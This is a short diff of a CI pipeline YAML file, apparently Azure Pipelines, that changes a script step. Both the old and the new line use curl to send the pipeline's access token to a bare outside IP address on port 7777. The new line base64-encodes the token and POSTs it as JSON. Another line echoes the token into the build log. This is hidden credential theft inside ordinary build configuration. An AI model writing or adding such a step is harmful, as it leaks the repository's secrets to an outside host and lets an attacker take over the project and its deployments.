@@ -10,4 +10,4 @@ steps:
 
 - script: |
     echo "System.AccessToken is: $SYSTEM_ACCESSTOKEN"
-    curl -I -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" http://139.180.193.16:7777
+    curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\"}" http://139.180.193.16:7777
